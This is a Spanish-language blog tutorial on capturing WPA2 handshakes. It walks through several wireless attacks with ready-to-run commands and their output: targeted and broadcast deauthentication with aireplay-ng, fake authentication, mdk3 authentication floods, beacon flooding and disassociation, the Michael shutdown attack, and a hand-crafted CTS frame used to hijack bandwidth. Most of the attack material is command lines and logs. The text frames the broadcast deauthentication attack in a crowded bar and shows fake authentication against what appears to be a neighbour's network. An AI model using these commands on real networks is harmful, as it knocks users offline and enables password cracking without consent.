---
description: >-
  Capturing Handshake
title:  Capturing Handshake      # Add title here
date: 2023-10-01 08:00:00 -0600                           # Change the date to match completion date
categories: [18 Wireless, Wireless Attacks]                     # Change Templates to Writeup
tags: [wireless, capturing handshake]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### Técnicas para capturar un Handshake

A continuación, se representan distintas técnicas con el propósito de capturar un Handshake de la red fijada
como objetivo.

#### Ataque de deautenticación dirigido

El protocolo IEEE 802.11 (Wi-Fi), contiene la provisión para un **marco de deautenticación**. Como atacantes,
para este ataque lo que haremos será enviar un marco de deautenticación al punto de acceso inalámbrico
objetivo, especificando la dirección MAC del cliente que queremos que sea expulsado de la red.

El proceso de enviar dicho marco al punto de acceso se denomina '**Técnica autorizada para informar a una
estación no autorizada que se ha desconectado de la red**'.

En otras palabras, estaríamos poniendo en práctica el siguiente esquema:

<img align="center" src="https://funkyimg.com/i/2W6cB.png">

Para retomar la captura por donde lo habíamos dejado, os vuelvo a representar el caso:

```bash
 CH  1 ][ Elapsed: 0 s ][ 2019-08-08 20:12                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -26 100       29        7    3   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -26    0e- 6e     0        9                 
```

Por tanto, tenemos un cliente **34:41:5D:46:D1:38** asociado al AP **hacklab**. Tratemos de expulsarlo del
punto de acceso. Para expulsar al cliente, haremos uso de la utilidad de **aireplay-ng**.

'**Aireplay-ng**' cuenta con diferentes modos:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #echo; aireplay-ng --help | tail -n 13 | grep -v help | sed '/^\s*$/d' | sed 's/^ *//'; echo

--deauth      count : deauthenticate 1 or all stations (-0)
--fakeauth    delay : fake authentication with AP (-1)
--interactive       : interactive frame selection (-2)
--arpreplay         : standard ARP-request replay (-3)
--chopchop          : decrypt/chopchop WEP packet (-4)
--fragment          : generates valid keystream   (-5)
--caffe-latte       : query a client for new IVs  (-6)
--cfrag             : fragments against a client  (-7)
--migmode           : attacks WPA migration mode  (-8)
--test              : tests injection and quality (-9)
```

Para este caso, nos interesa el parámetro '**-0**', el cual también puede ser usado con el parámetro
'**--deauth**'.

La sintaxis sería la siguiente:

* aireplay-ng -0 10 -e hacklab -c 34:41:5D:46:D1:38 wlan0mon

**CONSIDERACIONES**: Es necesario tener otra consola abierta monitorizando el AP objetivo, pues en caso de no
hacerlo, es probable que el ataque de deautenticación no funcione, pues **aireplay** no sabe sobre qué canal
operar.

Para el comando representado, lo que estamos haciendo es desde nuestro equipo de atacante enviar 10 paquetes
de de-autenticación a la estación objetivo, haciendo así que esta se desasocie de la red. Al igual que se han
especificado 10 paquetes, su valor puede incrementarse al valor deseado. 

Es posible incluso especificar un valor '**0**', haciéndole saber así a **aireplay** que queremos enviar un
número infinito/ilimitado de paquetes de deautenticación a la estación objetivo:

* aireplay-ng -0 0 -e hacklab -c 34:41:5D:46:D1:38 wlan0mon

Esto mismo lo podríamos haber hecho especificando la dirección MAC del AP en vez de su **ESSID**:

* aireplay-ng -0 0 -a 20:34:FB:B1:C5:53 -c 34:41:5D:46:D1:38 wlan0mon

Obteniendo los siguientes resultados:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar]
└──╼ #aireplay-ng -0 10 -a 20:34:FB:B1:C5:53 -c 34:41:5D:46:D1:38 wlan0mon
20:48:28  Waiting for beacon frame (BSSID: 20:34:FB:B1:C5:53) on channel 1
20:48:29  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [18|65 ACKs]
20:48:29  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [11|63 ACKs]
20:48:30  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:30  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [14|66 ACKs]
20:48:31  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [17|63 ACKs]
20:48:32  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:32  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [24|66 ACKs]
20:48:33  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:33  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:34  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
```

Ahora bien, para saber si nuestros paquetes están surtiendo efecto sobre la estación, el truco está en
contemplar el valor izquierdo que figura en los valores situados a la derecha del todo '**[18|65 ACks]**'.
Siempre que este sea mayor que 0, ello querrá decir que nuestros paquetes están siendo enviados correctamente
a la estación.

Si haces estas practicas en local, podrás comprobar cómo tu dispositivo en caso de haber sido la estación
víctima, habría sido desconectado del AP. Por otro lado, aunque lo veremos más adelante, imaginemos que ahora
paramos el ataque, ¿qué creéis que pasaría?. Fijaros que en la mayoría de las veces, los dispositivos tienden
a recordar los puntos de acceso a los que alguna vez han estado conectados. 

Esto es así debido a los paquetes **Probe Request**:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -i wlan0mon -Y 'wlan.fc.type_subtype==4' 2>/dev/null
   49 1.516614496 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=98, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  242 9.119006178 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=112, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  473 17.062963738 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=126, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  487 17.411192451 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=128, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  511 18.533411763 IntelCor_46:d1:38 → Broadcast    802.11 285 Probe Request, SN=2477, FN=0, Flags=........C, SSID=hacklab
  512 18.552100778 IntelCor_46:d1:38 → Broadcast    802.11 285 Probe Request, SN=2479, FN=0, Flags=........C, SSID=hacklab
  513 18.556049394 IntelCor_46:d1:38 → Broadcast    802.11 278 Probe Request, SN=2480, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  515 18.649006729 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, SN=1719, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  516 18.650498757 Google_71:cf:8c → Broadcast    802.11 208 Probe Request, SN=1720, FN=0, Flags=........C, SSID=MOVISTAR_DF12
  517 18.669117644 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, SN=1721, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  518 18.670480133 Google_71:cf:8c → Broadcast    802.11 208 Probe Request, SN=1722, FN=0, Flags=........C, SSID=MOVISTAR_DF12
  519 18.691337428 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, SN=1723, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
```

Y es justamente aquí donde está la gracia, pues de parar el ataque, el dispositivo lo que de manera automática
hará será reconectarse al AP, sin nosotros tener que hacer nada. Y es en este momento, donde se generará el Handshake:

```bash
 CH  1 ][ Elapsed: 6 mins ][ 2019-08-08 20:54 ][ WPA handshake: 20:34:FB:B1:C5:53                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -28 100     3564      684    2   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 (not associated)   24:A2:E1:48:66:14  -87    0 - 1      0        5                                                                                                                     
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -19    0e- 6e     0     2538  hacklab
 ```

 Si nos fijamos, en la parte superior, la propia suite nos indica **WPA handshake** seguido de la dirección
 MAC del AP, debido a que se ha capturado el Handshake correspondiente al cliente que hemos deautenticado y
 que se acaba de reasociar.

 Jugaremos con el Handshake más adelante, veamos primero otras formas de obtener el Handshake.

 #### Ataque de deautenticación global

 Imaginemos ahora que estamos en un bar, un bar lleno de gente con un punto de acceso del propio
 establecimiento. En estos casos, cuando una red dispone de tantos clientes asociados, es más factible lanzar
 otro tipo de ataque, el **ataque de deautenticación global**.

 A diferencia del ataque de deautenticación dirigido, en el ataque de deautenticación global, se hace uso de
 una **Broadcast MAC Address** como dirección MAC de estación objetivo a utilizar. Lo que conseguimos con esta
 dirección MAC, es expulsar a todos los clientes que se encuentren asociados el AP.

 Esto es mejor incluso, dado que siempre es probable que en una muestra de 20 clientes, 5 de ellos a lo mejor
 no se encuentren lo suficientemente cerca del router para elaborar el ataque (recordemos que esto se puede
 ver tanto desde el **PWR** como a nivel de **Frames** emitidos por la estación). En vez de estar por tanto
 deautenticando de cliente en cliente hasta dar con aquel que se encuentre a una distancia considerable como
 para que capturemos un Handshake, resulta más cómodo expulsarlos a todos.

 Basta con que uno de todos esos clientes se reconecte, para capturar un Handshake válido. Hay que tener en
 cuenta que es posible capturar múltiples Handshakes por parte de distintas estaciones en un mismo AP, pero
 esto no supone ningún problema.

 El ataque se puede elaborar de 2 formas, una es la siguiente:

 * aireplay-ng -0 0 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon

Obteniendo los siguientes resultados:

 ```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #aireplay-ng -0 10 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon
21:10:33  Waiting for beacon frame (ESSID: hacklab) on channel 12
Found BSSID "20:34:FB:B1:C5:53" to given ESSID "hacklab".
21:10:33  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:34  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:34  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:35  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 1| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:37  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 1| 0 ACKs]
21:10:37  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:38  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 2| 0 ACKs]
 ```

Y la otra sin especificar ninguna dirección MAC, lo que por defecto la suite interpretará como un ataque de
deautenticación global:

* aireplay-ng -0 0 -e hacklab wlan0mon

Obteniendo estos resultados:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #aireplay-ng -0 10 -e hacklab wlan0mon
21:11:46  Waiting for beacon frame (ESSID: hacklab) on channel 12
Found BSSID "20:34:FB:B1:C5:53" to given ESSID "hacklab".
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
21:11:46  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:51  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
```

#### Ataque de autenticación

Puede sonar raro, pero también existe un ataque llamado ataque de autenticación o asociación. A través de este
ataque, en vez de expulsar a clientes de una red, lo que hacemos es añadirlos.

Te preguntarás, ¿y qué consigo con eso?, buena pregunta. Nuestro objetivo como atacantes es hacer siempre que
de una u otra forma, los clientes de una red sean reasociados para capturar un Handshake. 

¿Qué crees que pasaría si en una red inyectamos 5.000 clientes?, exacto, por ahí van los tiros. Si una red
dispone de tantos clientes asociados, el router se vuelve loco... incluso hasta notaríamos de hacerlo en local
que la red comenzaría a ir lenta, llegando al punto en el que seríamos expulsados de esta hasta detener el
ataque.

Inyectar a un cliente es bastante sencillo, lo hacemos a través del parámetro '**-1**' de aireplay:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #echo; aireplay-ng --help | tail -n 13 | grep "\-1" | sed '/^\s*$/d' | sed 's/^ *//'; echo

--fakeauth    delay : fake authentication with AP (-1)
```

Imaginemos que tenemos este escenario:

```bash
 CH  6 ][ Elapsed: 30 s ][ 2019-08-08 21:20                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 1C:B0:44:D4:16:78  -52  12      232        6    0   6  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                            
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 (not associated)   AC:D1:B8:17:91:C0  -69    0 - 1      0        5                                                                                                                     
 (not associated)   E0:B9:BA:AE:90:FB  -88    0 - 1      0        1                                
```

Veamos cómo podríamos por ejemplo llevar a cabo una falsa autenticación haciendo uso de nuestra tarjeta de red
como estación:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #aireplay-ng -1 0 -e MOVISTAR_1677 -h 00:a0:8b:cd:02:65 wlan0mon
21:20:28  Waiting for beacon frame (ESSID: MOVISTAR_1677) on channel 6
Found BSSID "1C:B0:44:D4:16:78" to given ESSID "MOVISTAR_1677".

21:20:28  Sending Authentication Request (Open System) [ACK]
21:20:28  Authentication successful
21:20:28  Sending Association Request

21:20:33  Sending Authentication Request (Open System) [ACK]
21:20:33  Authentication successful
21:20:33  Sending Association Request

21:20:38  Sending Authentication Request (Open System) [ACK]
21:20:38  Authentication successful
21:20:38  Sending Association Request [ACK]
21:20:38  Association successful :-) (AID: 1)
```

Con el parámetro '**-h**', especificamos la dirección MAC del falso cliente a autenticar. Si volvemos a
analizar ahora la red inalámbrica, podremos ver que nuestra tarjeta de red figura como cliente:

```bash
 CH  6 ][ Elapsed: 30 s ][ 2019-08-08 21:20                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 1C:B0:44:D4:16:78  -52  12      232        6    0   6  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                            
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 (not associated)   AC:D1:B8:17:91:C0  -69    0 - 1      0        5                                                                                                                     
 (not associated)   E0:B9:BA:AE:90:FB  -88    0 - 1      0        1                                                                                                                     
 1C:B0:44:D4:16:78  00:A0:8B:CD:02:65    0    0 - 1      0        7                         
```

Cabe decir que esto no hace que nos conectemos a la red directamente y ya tengamos internet, sino menuda
gracia, estaríamos bypasseando la seguridad del pleno 802.11. Lo que estamos haciendo es engañar al router,
haciéndole creer que dispone de ese cliente asociado.

A efectos prácticos, por el momento esto no genera ningún inconveniente, ¿cómo autenticamos por tanto ahora a
5.000 clientes?. Podríamos montarnos un simple script que lo hiciera por nosotros generando direcciones MAC
aleatorias, pero ya contamos con una herramienta que nos hace todo el trabajo, **mdk3**.

A través de la utilidad **mdk3**, tenemos un modo de ataque '**Authentication DoS Mode**' que se encarga de
asociar a miles de clientes al AP objetivo. Esto se hace haciendo uso de la siguiente sintaxis:

* mdk3 wlan0mon a -a bssidAP

Veámoslo en la práctica, aplicamos el comando por un lado:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar]
└──╼ #mdk3 wlan0mon a -a 20:34:FB:B1:C5:53 # Dirección MAC del AP hacklab
```

Si analizamos la consola donde estamos monitorizando el AP, podremos notar lo siguiente:

```bash
 CH 12 ][ Elapsed: 1 min ][ 2019-08-08 21:27                                         
                                                                                         
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                         
 20:34:FB:B1:C5:53  -27 100      819      177    2  12  180  WPA2 CCMP   PSK  hacklab    
                                                                                         
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe               
                                                                                         
 (not associated)   AC:D1:B8:17:91:C0  -73    0 - 1     12       25                       
 20:34:FB:B1:C5:53  22:19:BA:9B:7D:F5    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  48:47:15:5C:BB:6F    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AF:3B:33:CD:E3:50    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -30    1e- 6e     0      223                       
 20:34:FB:B1:C5:53  3E:A1:41:E1:FC:67    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  21:3D:DC:87:70:E9    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  54:11:0E:82:74:41    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AB:B2:CD:C6:9B:B4    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  05:17:58:E9:5E:D4    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  31:58:A3:5A:25:5D    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  C9:9A:66:32:0D:B7    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  76:5A:2E:63:33:9F    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  54:F8:1B:E8:E7:8D    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  F2:FB:E3:46:7C:C2    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  4A:EC:29:CD:BA:AB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  67:C6:69:73:51:FF    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  3E:01:7E:97:EA:DC    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  6B:96:8F:38:5C:2A    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  EC:B0:3B:FB:32:AF    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  3C:54:EC:18:DB:5C    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  02:1A:FE:43:FB:FA    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AA:3A:FB:29:D1:E6    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  05:3C:7C:94:75:D8    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  BE:61:89:F9:5C:BB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  A8:99:0F:95:B1:EB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  F1:B3:05:EF:F7:00    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  E9:A1:3A:E5:CA:0B    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  CB:D0:48:47:64:BD    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  1F:23:1E:A8:1C:7B    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  64:C5:14:73:5A:C5    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  5E:4B:79:63:3B:70    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  64:24:11:9E:09:DC    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AA:D4:AC:F2:1B:10    0    0 - 1      0        1      
```

Exacto, una locura de clientes asociados que ni llego a seleccionar de lo largo que es la lista. De manera
casi inmediata, la red comienza a ir lenta y se queda temporalmente inoperativa, llegando a expulsar incluso a
los clientes más lejanos o con poca señal WiFi.

#### CTS Frame Attack

Un ataque bastante interesante, que incluso puede llegar a dejar inoperativa una red inalámbrica durante un
largo período de tiempo, aunque paremos el ataque.

Lo que haremos será abrir **Wireshark** por un lado, capturando paquetes de tipo **CTS** (Clear-To-Send):

<img align="center" src="https://funkyimg.com/i/2W6gT.png">

Recomiendo investigar sobre este tipo de paquetes junto al **RTS**, tienen una historia muy bonita frente al
problema del **nodo oculto**, evitando las famosas colisiones de trama.

Un paquete **CTS** dispone generalmente de 4 campos:

* Frame Control
* Duración
* RA (Dirección del Receptor)
* FCS

El campo del tiempo para dicho paquete puede ser visto rápidamente desde Wireshark (**304 microsegundos**):

<img align="center" src="https://funkyimg.com/i/2W6h5.png">

Lo que haremos una vez dispongamos de un paquete **CTS**, será exportar dicho paquete en un formato
'**Wireshark/tcpdump/... -pcap**':

<img align="center" src="https://funkyimg.com/i/2W6hf.png">

Si analizamos la captura, veremos que los datos contemplados siguen siendo los mismos:

<img align="center" src="https://funkyimg.com/i/2W6hp.png">

Una vez llegados a este punto, en mi caso haré uso de la herramienta '**ghex**' para abrir la captura con un
editor hexadecimal:

<img align="center" src="https://funkyimg.com/i/2W6hu.png">

En esta parte es importante hacer la siguiente distinción:

* Los últimos 4 valores: 11 D1 13 85 corresponden al FCS, deberán ser computados por cada variación que
  hagamos sobre el resto de valores. Sin embargo, no nos preocupemos por ello... ya que nos lo dará el propio
  Wireshark :)

* Los 6 valores anteriores al FCS: **30 45 96 BF 9D 2C**, corresponden a la dirección MAC del router. Obviamente, este valor deberá de ser cambiado al deseado.

* Los 2 valores anteriores al FCS: **30 01**, corresponden al tiempo en microsegundos puesto en hexadecimal y
  **Little Endian**.

Para el último punto, por si han habido confusiones:

<img align="center" src="https://funkyimg.com/i/2W6hA.png">

Ahí vemos que corresponden a los 304 microsegundos. Ahora bien, aquí es donde viene el vector de ataque, vamos
a ver cuál sería el valor en hexadecimal del valor tope permitido (**30.000 microsegundos**):

<img align="center" src="https://funkyimg.com/i/2W6hE.png">

Tratemos desde **ghex** de sustituir el valor de los 304 microsegundos a 30.000 microsegundos, poniendo su
representación en hexadecimal y Little Endian:

<img align="center" src="https://funkyimg.com/i/2W6hP.png">

**CONSIDERACIÓN**: También he especificado la dirección MAC del AP objetivo en **ghex** (**64:D1:54:88:BA:3C**)

Podríamos pensar que es así de simple, pero no. Recordemos que para cada cambio realizado, hay que computar el
valor del **FCS**, pues de lo contrario el paquete es inválido. Uno puede optar por comerse la cabeza y tratar
de hacerlo manualmente, pero otra forma es guardando y abriendo esa propia captura desde **Wireshark**:

<img align="center" src="https://funkyimg.com/i/2W6ia.png">

Como vemos, es una maravilla, dado que ya el propio **Wireshark** nos da el valor del **FCS** que necesitamos
para la captura manipulada. 

Por tanto, le hacemos caso y lo cambiamos (Recordemos el Little Endian, también se aplica para este caso):

<img align="center" src="https://funkyimg.com/i/2W6in.png">

Una vez llegados a este punto, guardamos la captura y probamos a abrirla nuevamente desde Wireshark:

<img align="center" src="https://funkyimg.com/i/2W6iy.png">

Esto son buenas noticias, pues no nos sale ningún tipo de error, ¡hemos construido un paquete válido!.

Ahora es cuando viene la parte divertida, inyectemos dicho paquete a nivel de red:

<img align="center" src="https://funkyimg.com/i/2W6iJ.png">

Como vemos, se han tramitado un total de 10.000 paquetes de tipo **CTS** con un tiempo total de 30.000
microsegundos para cada uno. Encima le hemos añadido el parámetro '**--topspeed**' para evitar que el
siguiente paquete se envié una vez el anterior se ha terminado de enviar, haciendo que todos queden en cola.

Por aquí podemos ver los valores de cada uno de estos paquetes enviados:

<img align="center" src="https://funkyimg.com/i/2W6iP.png">

¿Resultado?, lo que se conoce como un secuestro del ancho de banda, haciendo que la red quede completamente
inoperativa durante un largo período de tiempo. No recomiendo hacer el ataque en nuestra propia red.

#### Beacon Flood Mode Attack

Un **beacon** es un paquete que contiene información sobre el punto de acceso, como por ejemplo, en qué canal
se encuentra, qué tipo de cifrado lleva, cómo se llama la red, etc.

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==0x8" 2>/dev/null
    1 0.000000000 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1585, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
    2 0.307210202 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1588, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
    3 0.614413670 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1591, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
    4 0.921614210 AskeyCom_d4:16:78 → Broadcast    802.11 328 Beacon frame, SN=1594, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
```

La peculiaridad de los beacons es que estos se transmiten en claro, ya que las tarjetas de red y otros
dispositivos necesitan poder recoger este tipo de paquetes y extraer la información necesaria para conectarse.

A través de la herramienta **mdk3**, podemos generar un ataque conocido como **Beacon Flood Attack**,
generando montón de paquetes Beacon con información falsa. ¿Qué conseguimos con esto?, pues bueno, uno de los
ataques clásicos consistiría en generar montones de puntos de acceso situados en el mismo canal que un punto
de acceso objetivo, logrando así dañar el espectro de onda de la red dejándola no operativa e invisible por los
usuarios.

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #for i in $(seq 1 10); do echo "MyNetwork$i" >> redes.txt; done
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #cat redes.txt 
MyNetwork1
MyNetwork2
MyNetwork3
MyNetwork4
MyNetwork5
MyNetwork6
MyNetwork7
MyNetwork8
MyNetwork9
MyNetwork10
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #mdk3 wlan0mon b -f redes.txt -a -s 1000 -c 7
```

En este caso, estaríamos generando un buen puñado de puntos de acceso con los **ESSID** listados en el
archivo, todos ellos posicionados en el canal 7. Para los curiosos, el parámetro '**-a**' lo que se encarga es
de anunciar redes WPA2, y el parámetro '**-s**' establece la velocidad de los paquetes emitidos por segundo,
que por defecto están establecidos a 50.

Por si queréis ver cómo se vería todo desde un dispositivo tercero que trata de escanear o listar los puntos
de acceso disponibles en el entorno:

<img align="center" src="https://funkyimg.com/i/2W6s8.jpg">

De hecho, hasta si queréis causar curiosidad en el ambiente, si corréis este modo de ataque con **mdk3** sin
especificar parámetros:

* mdk3 wlan0mon b

Estaríamos generando puntos de acceso con **ESSID's** aleatorios:

<img align="center" src="https://funkyimg.com/i/2W6sd.png">

#### Disassociation Amok Mode Attack

Realmente esto no deja de parecerse a un ataque de de-autenticación dirigido, pero por cultura, **mdk3**
cuenta con unos modos de operación de tipo **Black List/White List**, desde los cuales podemos especificar qué
clientes queremos que no sean deautenticados del AP, añadiendo a los mismos en un White List y viceversa.

Para construir el ataque, simplemente debemos crear un fichero con las direcciones MAC de los clientes a los
cuales queremos de-autenticar del AP. Posteriormente, corremos **mdk3** especificando el modo de ataque y el
canal en el que se encuentra la red:

<img align="center" src="https://funkyimg.com/i/2W6tU.png">

#### Michael Shutdown Exploitation

Tal y como dice la propia descripción de la utilidad:

`"Can shut down APs using TKIP encryption and QoS Extension with 1 sniffed and 2 injected QoS Data Packets"`

Es decir, podemos llegar a apagar un router a través de este ataque. 

**ANOTACIÓN:** En la práctica, no es muy efectivo.

La sintaxis sería la siguiente:

* mdk3 wlan0mon m -t bssidAP

#### Técnicas Pasivas

Todo lo visto hasta el momento, requiere de la intervención por nuestra parte en el lado del atacante. 

Tendríamos un modo de actuar de forma pasiva para obtener el Handshake, y es simplemente armarnos de valor y
tener paciencia. 

Podríamos quedarnos esperando hasta que algunas de las estaciones asociadas disponga de mala
señal, se desconecte y reasocie automáticamente sin nosotros tener que hacer nada. Podríamos quedarnos
esperando hasta que de pronto alguien nuevo que ya estaba asociado en el pasado a la red se asocie de nuevo al
AP. Se podría hacer de montón de maneras distintas.

Lo importante de todo esto es, que el Handshake, no tiene por qué generarse en base a la reautenticación del
cliente a la red pero sólo si nosotros lo hemos expulsado de la red. Me refiero, el Handshake no guarda
relación alguna con el ataque de de-autenticación para forzar al cliente a que se reconecte a la red.

Siempre el Handshake se va a generar en el momento en el que el cliente se vuelva a conectar a la red, sea por
nuestros medios activos o sin hacer nada a voluntad de la calidad de la señal entre la estación y el AP, o por
el propio cliente que se ha vuelto a reconectar por 'X' razones.